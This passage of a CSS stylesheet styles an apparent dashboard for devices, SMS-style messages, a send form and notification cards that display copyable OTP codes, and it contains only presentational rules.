  .dt-table thead { background:#141b2d; position:sticky; top:0; z-index:1; }
  .dt-table th { padding:8px 12px; text-align:left; font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:#64748b; border-bottom:1px solid rgba(255,255,255,0.07); white-space:nowrap; }
  .dt-row { cursor:pointer; transition:background 80ms; border-bottom:1px solid rgba(255,255,255,0.03); }
  .dt-row:last-child { border-bottom:none; }
  .dt-row:hover { background:rgba(255,255,255,0.03); }
  .dt-row.dt-sel { background:rgba(249,115,22,0.07); }
  .dt-table td { padding:8px 12px; vertical-align:middle; }
  .td-st { display:flex; align-items:center; gap:7px; }
  .td-dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
  .ton { background:#22c55e; box-shadow:0 0 5px rgba(34,197,94,.5); }
  .toff { background:#2d3748; }
  .tunk { background:#1a2236; border:1px solid #253048; }
  .son { color:#22c55e; font-weight:600; }
  .soff { color:#64748b; font-weight:600; }
  .sunk { color:#334155; font-weight:600; }
  .td-key { font-size:11.5px; color:#e2e8f0; }
  .td-num { font-size:12px; color:#94a3b8; }
  .td-del { background:none; border:none; color:#475569; font-size:16px; cursor:pointer; width:22px; height:22px; border-radius:4px; display:flex; align-items:center; justify-content:center; transition:all 120ms; padding:0; font-family:inherit; line-height:1; }
  .td-del:hover { color:#ef4444; background:rgba(239,68,68,0.12); }

  /* DEVICE */
  .dv-card { display:flex; align-items:center; gap:14px; background:#141b2d; border:1px solid rgba(255,255,255,0.08); border-top:3px solid #f97316; border-radius:10px; padding:16px 20px; }
  .dv-left { display:flex; align-items:center; gap:12px; flex:1; min-width:0; }
  .dv-ico { width:48px; height:48px; border-radius:10px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); display:flex; align-items:center; justify-content:center; flex-shrink:0; }
  .dv-id { font-size:20px; font-weight:700; color:#e2e8f0; overflow:hidden; text-overflow:ellipsis; }
  .ob { font-size:10px; font-weight:700; padding:3px 10px; border-radius:20px; text-transform:uppercase; letter-spacing:0.05em; }
  .ob-on  { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .ob-off { background:rgba(100,116,139,0.1); color:#64748b; border:1px solid rgba(100,116,139,0.2); }
  .ob-unk { background:rgba(100,116,139,0.07); color:#334155; border:1px solid rgba(100,116,139,0.12); }
  .dv-bat { display:flex; flex-direction:column; align-items:flex-end; gap:2px; flex-shrink:0; }
  .dv-bat-n { font-size:44px; font-weight:800; font-family:'JetBrains Mono',monospace; line-height:1; letter-spacing:-0.04em; }
  .dv-bat-l { font-size:9px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; }
  .bat-track { width:80px; height:4px; background:rgba(255,255,255,0.09); border-radius:2px; overflow:hidden; margin-top:4px; }
  .bat-fill { height:100%; border-radius:2px; transition:width 600ms; }
  .info-grid { display:grid; grid-template-columns:repeat(4,1fr); background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:10px; overflow:hidden; }
  .ib { display:flex; flex-direction:column; gap:4px; padding:12px 14px; border-right:1px solid rgba(255,255,255,0.07); }
  .ib:last-child { border-right:none; }
  .ib-l { font-size:9.5px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:#64748b; }
  .ib-v { font-size:13.5px; font-weight:600; color:#e2e8f0; }
  .act-row { display:flex; gap:10px; }
  .dev-used-row { display:flex; align-items:center; background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:8px; padding:10px 14px; }
  .dev-used-label { display:flex; align-items:center; gap:8px; cursor:pointer; font-size:13px; font-weight:600; color:#94a3b8; user-select:none; }
  .dev-used-label:has(input:checked) { color:#22c55e; }
  .dev-used-label input { accent-color:#f97316; width:15px; height:15px; cursor:pointer; }
  .act-btn { flex:1; display:flex; align-items:center; justify-content:center; gap:8px; padding:14px; border-radius:9px; font-size:15px; font-weight:700; cursor:pointer; border:none; font-family:inherit; transition:all 160ms; }
  .ab-msg { background:#4f46e5; color:#fff; box-shadow:0 4px 18px rgba(79,70,229,0.4); }
  .ab-msg:hover { background:#4338ca; transform:translateY(-1px); }
  .ab-snd { background:#16a34a; color:#fff; box-shadow:0 4px 18px rgba(22,163,74,0.4); }
  .ab-snd:hover:not(:disabled) { background:#15803d; transform:translateY(-1px); }
  .ab-snd:disabled { opacity:.4; cursor:not-allowed; transform:none; }
  .afc { background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:10px; overflow:hidden; }
  .afc-hdr { padding:8px 12px; font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; border-bottom:1px solid rgba(255,255,255,0.07); }
  .afc-body { max-height:320px; overflow-y:auto; }
  .af-row { display:flex; align-items:center; gap:8px; padding:6px 12px; border-bottom:1px solid rgba(255,255,255,0.03); }
  .af-row:hover { background:rgba(255,255,255,0.03); }
  .af-k { font-size:11px; color:#64748b; min-width:100px; max-width:120px; flex-shrink:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .af-v { font-size:12px; color:#e2e8f0; flex:1; word-break:break-all; }
  .af-cp { background:none; border:none; color:#475569; cursor:pointer; padding:3px; border-radius:3px; transition:all 120ms; font-family:inherit; flex-shrink:0; }
  .af-cp:hover { color:#94a3b8; }
  .bool-b { padding:1px 7px; border-radius:4px; font-size:10.5px; font-weight:700; font-family:'JetBrains Mono',monospace; }
  .bt { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .bf { background:rgba(239,68,68,0.12); color:#ef4444; border:1px solid rgba(239,68,68,0.25); }

  /* MESSAGES */
  .msg-topbar { display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
  .msg-count { font-size:17px; font-weight:700; color:#e2e8f0; white-space:nowrap; }
  .msg-search-wrap { flex:1; display:flex; align-items:center; gap:6px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.09); border-radius:7px; padding:7px 10px; min-width:180px; }
  .msg-search { background:none; border:none; outline:none; font-size:13px; color:#e2e8f0; width:100%; font-family:inherit; }
  .msg-search::placeholder { color:#475569; }
  .msg-tabs { display:flex; gap:4px; flex-shrink:0; }
  .mtab { padding:6px 14px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background:rgba(255,255,255,0.04); color:#64748b; font-size:12px; font-weight:600; cursor:pointer; font-family:inherit; transition:all 120ms; }
  .mta { background:#f97316!important; color:#fff!important; border-color:#f97316!important; }
  .mti { background:rgba(56,189,248,0.15)!important; color:#38bdf8!important; border-color:rgba(56,189,248,0.35)!important; }
  .mto { background:rgba(249,115,22,0.15)!important; color:#f97316!important; border-color:rgba(249,115,22,0.35)!important; }
  .msg-list { display:flex; flex-direction:column; gap:8px; }
  .msg-card { background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:9px; padding:10px 12px; display:flex; flex-direction:column; gap:5px; transition:background 80ms; }
  .msg-card:hover { background:#172035; }
  .mc-row { display:flex; align-items:center; gap:10px; }
  .mc-sender { font-size:13px; font-weight:700; color:#e2e8f0; }
  .mc-badge { font-size:10px; font-weight:700; padding:2px 8px; border-radius:10px; text-transform:uppercase; letter-spacing:0.05em; }
  .badge-in  { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .badge-out { background:rgba(249,115,22,0.15); color:#f97316; border:1px solid rgba(249,115,22,0.3); }
  .mc-body { font-size:12.5px; color:#cbd5e1; line-height:1.5; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; }
  .mc-foot { display:flex; align-items:center; gap:8px; }
  .mc-dt { font-size:10.5px; color:#475569; font-family:'JetBrains Mono',monospace; }

  /* SEND */
  .send-wrap { max-width:560px; }
  .send-hdr { font-size:22px; font-weight:800; }
  .send-sub { font-size:12px; color:#64748b; margin-top:4px; }
  .send-form { display:flex; flex-direction:column; gap:14px; margin-top:16px; }
  .field { display:flex; flex-direction:column; gap:6px; }
  .field label { font-size:12px; font-weight:600; color:#94a3b8; }

  /* SHARED */
  input, textarea { background:#0d1117; border:1px solid rgba(255,255,255,0.1); border-radius:7px; padding:8px 10px; color:#e2e8f0; font-size:13px; font-family:inherit; outline:none; width:100%; transition:border-color 130ms; }
  input:focus, textarea:focus { border-color:rgba(249,115,22,0.5); }
  textarea { resize:vertical; }
  .code { font-family:'JetBrains Mono',monospace; font-size:12px; }
  .json-view { font-family:'JetBrains Mono',monospace; font-size:11px; color:#94a3b8; white-space:pre-wrap; word-break:break-all; max-height:200px; overflow-y:auto; background:rgba(0,0,0,0.3); border-radius:6px; padding:8px; margin:0; }
  .mono { font-family:'JetBrains Mono',monospace; }
  .btn { padding:8px 16px; border-radius:7px; font-size:13px; font-weight:600; cursor:pointer; border:none; font-family:inherit; transition:all 140ms; }
  .btn-primary { background:#f97316; color:#fff; box-shadow:0 3px 12px rgba(249,115,22,0.3); }
  .btn-primary:hover:not(:disabled) { background:#ea6c0a; }
  .btn-ghost { background:rgba(255,255,255,0.06); color:#94a3b8; border:1px solid rgba(255,255,255,0.1); }
  .btn-ghost:hover { background:rgba(255,255,255,0.1); color:#e2e8f0; }
  .btn-sm { padding:5px 12px; font-size:12px; }

  .spin-ring { display:inline-block; width:20px; height:20px; border:3px solid rgba(255,255,255,.2); border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; }

  /* TOASTS */
  .toast-stack { position:fixed; bottom:22px; right:22px; z-index:999; display:flex; flex-direction:column; gap:8px; pointer-events:none; }
  .toast { background:#1a2232; border:1px solid rgba(249,115,22,0.3); border-radius:8px; padding:10px 14px; font-size:13px; color:#e2e8f0; box-shadow:0 8px 32px rgba(0,0,0,0.7); animation:toast-in .2s ease both; min-width:180px; max-width:300px; }
  .toast.out { animation:toast-out .3s ease forwards; }
  .toast.success { border-color:rgba(34,197,94,0.4); color:#22c55e; }
  .toast.error   { border-color:rgba(239,68,68,0.4); color:#ef4444; }
  .toast.info    { border-color:rgba(56,189,248,0.3); color:#38bdf8; }

  @keyframes spin { to { transform:rotate(360deg); } }
  @keyframes toast-in  { from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none} }
  @keyframes toast-out { from{opacity:1}to{opacity:0;transform:translateY(6px)} }

  @media (max-width:900px)  { .stat-row{grid-template-columns:1fr 1fr;} .info-grid{grid-template-columns:1fr 1fr;} .ap-grid{grid-template-columns:1fr 1fr;} }
  @media (max-width:640px)  { .sidebar{display:none;} .act-row{flex-direction:column;} }

  /* ── NOTIFICATION STACK (top-left) ───────────────────────────────────── */
  /* ── NOTIFICATION STACK — Apple glass ───────────────────────────────────── */
  /* ── NOTIFICATION STACK ─────────────────────────────────────────────────── */
  /* ══ NOTIFICATION STACK — Apple Liquid Glass ═════════════════════════════ */
  .notif-stack {
    position: fixed; top: 54px; right: 16px; z-index: 1000;
    display: flex; flex-direction: column; gap: 8px;
    pointer-events: none; width: 360px;
  }
  .notif-scroll {
    display: flex; flex-direction: column; gap: 8px;
    overflow-y: auto; overflow-x: hidden;
    max-height: calc(4 * 204px + 3 * 8px); /* 4 cards max */
    pointer-events: all;
    padding-right: 2px;
    scrollbar-width: thin;
    scrollbar-color: rgba(255,255,255,0.08) transparent;
    user-select: none;
  }
  .notif-scroll::-webkit-scrollbar { width: 3px; }
  .notif-scroll::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }

  /* ── Card: Apple Liquid Glass ─────────────────────────────────────────── */
  .notif {
    pointer-events: all;
    position: relative;
    overflow: hidden;

    /* min-height so OTP is never clipped — card grows if needed */
    min-height: 190px;
    display: flex; flex-direction: column;

    /* Opaque dark glass */
    background:
      linear-gradient(
        135deg,
        rgba(255,255,255,0.07),
        rgba(255,255,255,0.01) 45%,
        rgba(80,130,255,0.025)
      ),
      rgba(11,14,23,0.94);

    -webkit-backdrop-filter: blur(28px) saturate(180%);
    backdrop-filter: blur(28px) saturate(180%);

    border: 1px solid rgba(255,255,255,0.16);
    border-top-color: rgba(255,255,255,0.28);
    border-radius: 26px;

    box-shadow:
      0 20px 60px rgba(0,0,0,0.38),
      0 4px 16px rgba(0,0,0,0.2),
      inset 0 1px 0 rgba(255,255,255,0.12),
      inset 0 -1px 0 rgba(255,255,255,0.035);

    padding: 13px 15px 11px;
    color: #f8fafc;
    animation: notif-in 0.34s cubic-bezier(0.34,1.4,0.64,1) both;
    transition: background 220ms ease, border-color 220ms ease,
                box-shadow 220ms ease, transform 220ms ease;
  }
  /* Reflective sheen layer */
  .notif::before {
    content: "";
    position: absolute; inset: 0;
    pointer-events: none;
    border-radius: inherit;
    z-index: 0;
    background: linear-gradient(
      115deg,
      rgba(255,255,255,0.09) 0%,
      rgba(255,255,255,0.025) 22%,
      transparent 48%,
      rgba(100,150,255,0.035) 100%
    );
    opacity: 0.8;
  }
  /* All card children above sheen */
  .notif > * { position: relative; z-index: 1; }

  @media (hover: hover) {
    .notif:hover {
      border-color: rgba(255,255,255,0.24);
      box-shadow: 0 24px 70px rgba(0,0,0,0.42), inset 0 1px 0 rgba(255,255,255,0.16);
      transform: translateY(-1px);
    }
  }
  .notif.nleave { animation: notif-out 0.25s ease forwards; }

  /* Fallback: no backdrop-filter */
  @supports not ((backdrop-filter: blur(1px)) or (-webkit-backdrop-filter: blur(1px))) {
    .notif { background: rgba(15,20,38,0.97); }
  }

  /* Header row */
  .n-top  { display:flex; align-items:center; justify-content:space-between; gap:6px; flex-shrink:0; }
  .n-ids  { display:flex; align-items:center; gap:6px; min-width:0; overflow:hidden; }
  .n-conn { font-size:10px; font-weight:800; letter-spacing:0.07em; flex-shrink:0; }
  .n-dev-wrap { display:inline-flex; align-items:center; gap:3px; min-width:0; overflow:hidden; }
  .n-dev  { font-size:10px; color:rgba(255,255,255,0.6); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-family:'JetBrains Mono',monospace; }
  .n-dev-copy {
    background:none; border:none; padding:0; cursor:pointer;
    color:rgba(255,255,255,0.2); display:flex; align-items:center;
    flex-shrink:0; opacity:0; transition:opacity 140ms, color 140ms;
    line-height:1;
  }
  .n-dev-wrap:hover .n-dev-copy { opacity:1; color:rgba(255,255,255,0.55); }
  .n-time { font-size:10px; color:rgba(255,255,255,0.55); font-family:'JetBrains Mono',monospace; flex-shrink:0; }

  .n-close {
    width:19px; height:19px; border-radius:50%; flex-shrink:0;
    border:1px solid rgba(255,255,255,0.14);
    background:rgba(255,255,255,0.07);
    color:rgba(255,255,255,0.4); cursor:pointer;
    font-size:13px; display:flex; align-items:center; justify-content:center;
    padding:0; line-height:1; font-family:inherit;
    transition: background 160ms, transform 160ms;
  }
  .n-close:hover { background:rgba(239,68,68,0.35); border-color:rgba(239,68,68,0.5); color:#fff; }
  .n-close:active { transform:scale(0.92); }

  /* Sender */
  .n-sender { font-size:13.5px; font-weight:700; color:#fff; letter-spacing:-0.01em; margin-top:3px; flex-shrink:0; }

  /* Message — strictly 2 lines in pixel height so OTP is never pushed out */
  .n-msg {
    font-size:11.5px; color:rgba(255,255,255,0.82); line-height:1.45;
    height: calc(11.5px * 1.45 * 2); /* exactly 2 lines */
    overflow: hidden;
    display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical;
    flex-shrink: 0;
  }

  .n-expand-btn {
    align-self:flex-start; flex-shrink:0;
    background:none; border:none; cursor:pointer;
    font-size:10px; font-weight:600; color:rgba(255,255,255,0.5);
    padding:0; font-family:inherit; transition:color 130ms; letter-spacing:0.03em;
  }
  .n-expand-btn:hover { color:rgba(255,255,255,0.6); }

  /* Spacer pushes OTP to bottom */
  .n-spacer { flex:1; }

  /* OTP — Green Liquid Glass panel, always at card bottom */
  .n-otp-row {
    position: relative; overflow: hidden; flex-shrink:0;
    display: flex; align-items:center; gap:10px;
    padding: 8px 13px;
    margin-top: auto;

    background:
      linear-gradient(135deg, rgba(52,211,153,0.13), rgba(16,185,129,0.035)),
      rgba(6,78,59,0.42);
    -webkit-backdrop-filter: blur(18px) saturate(160%);
    backdrop-filter: blur(18px) saturate(160%);
    border: 1px solid rgba(52,211,153,0.38);
    border-radius: 18px;

    box-shadow:
      inset 0 1px 0 rgba(255,255,255,0.08),
      inset 0 0 24px rgba(16,185,129,0.06);

    cursor: pointer; user-select:none;
    transition: border-color 180ms, box-shadow 180ms;
  }
  .n-otp-row:hover {
    border-color: rgba(52,211,153,0.6);
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 0 18px rgba(52,211,153,0.18);
  }
  .n-otp-row:active { transform:scale(0.98); }
  .n-otp-label { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:0.12em; color:rgba(52,211,153,0.65); flex-shrink:0; }
  .n-otp-code  {
    font-family:'JetBrains Mono',monospace; font-size:22px; font-weight:900;
    color: #4ade80;
    text-shadow: 0 0 18px rgba(74,222,128,0.18);
    font-variant-numeric: tabular-nums;
    letter-spacing:0.14em; flex:1;
  }
  .n-otp-copy-ico { color:rgba(74,222,128,0.45); flex-shrink:0; transition:opacity 130ms, color 130ms; }
  .n-otp-row:hover .n-otp-copy-ico { color:rgba(74,222,128,0.9); }

  /* Clear all */
  .notif-clear-all {
    pointer-events:all; width:100%; padding:10px 14px;
    border-radius:16px; border:1px solid rgba(255,255,255,0.1);
    background: rgba(15,20,38,0.8);
    backdrop-filter:blur(24px); -webkit-backdrop-filter:blur(24px);
    color:rgba(255,255,255,0.38); font-size:11.5px; font-weight:600;
    cursor:pointer; font-family:inherit; transition:all 160ms;
    text-align:center; letter-spacing:0.03em;
  }
  .notif-clear-all:hover { background:rgba(239,68,68,0.2); border-color:rgba(239,68,68,0.4); color:#fca5a5; }
  .notif-clear-all:active { transform:scale(0.98); }

  /* ── OTP in messages ──────────────────────────────────────────────────── */
  .mc-otp { display:flex; align-items:center; gap:8px; margin:4px 0; background:rgba(34,197,94,0.07); border:1px solid rgba(34,197,94,0.2); border-radius:7px; padding:6px 10px; cursor:pointer; user-select:none; transition:all 140ms; }
  .mc-otp:hover { background:rgba(34,197,94,0.16); border-color:rgba(34,197,94,0.45); transform:scale(1.01); }
  .mc-otp:active { transform:scale(0.98); }
  .otp-copy-hint { margin-left:auto; color:rgba(34,197,94,0.5); opacity:0; transition:opacity 140ms; flex-shrink:0; display:flex; align-items:center; }
  .mc-otp:hover .otp-copy-hint { opacity:1; }
  .otp-label { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; flex-shrink:0; }
  .otp-code { font-family:'JetBrains Mono',monospace; font-size:20px; font-weight:900; color:#22c55e; letter-spacing:0.18em; flex:1; }
  .otp-copy-btn { padding:5px 12px; border-radius:6px; border:none; background:#22c55e; color:#fff; font-size:12px; font-weight:700; cursor:pointer; font-family:inherit; transition:all 130ms; flex-shrink:0; white-space:nowrap; }
  .otp-copy-btn:hover { background:#16a34a; transform:scale(1.03); }

  /* ── Used / checkbox ─────────────────────────────────────────────────── */
  .mc-check { width:14px; height:14px; accent-color:#f97316; cursor:pointer; flex-shrink:0; }
  .mc-used { opacity:0.55; }
  .mc-body-used { text-decoration:line-through; color:#475569!important; }
  .mc-used-tag { font-size:10px; font-weight:700; color:#22c55e; background:rgba(34,197,94,0.12); border:1px solid rgba(34,197,94,0.25); border-radius:4px; padding:1px 6px; margin-left:auto; }

  /* ── Phone edit ──────────────────────────────────────────────────────── */
  .phone-edit-row { display:flex; gap:5px; align-items:center; }
  .phone-edit-in { font-size:12px; padding:5px 8px; border-radius:5px; flex:1; min-width:0; }
  .edit-ph-btn { background:none; border:none; font-size:11px; color:#64748b; cursor:pointer; padding:2px 5px; border-radius:4px; font-family:inherit; transition:all 120ms; }
  .edit-ph-btn:hover { color:#f97316; background:rgba(249,115,22,0.08); }
  .add-ph { color:#f97316!important; border:1px dashed rgba(249,115,22,0.35)!important; padding:4px 9px!important; }

  @keyframes notif-in  { 
    0%   { opacity:0; transform:translateX(24px) scale(0.92); filter:blur(4px); }
    60%  { opacity:1; filter:blur(0); }
    100% { opacity:1; transform:translateX(0) scale(1); filter:blur(0); }
  }
  @keyframes notif-out { 
    0%   { opacity:1; transform:scale(1) translateX(0); max-height:200px; }
    100% { opacity:0; transform:scale(0.9) translateX(16px); max-height:0; margin:0; padding:0; }
  }
</style>
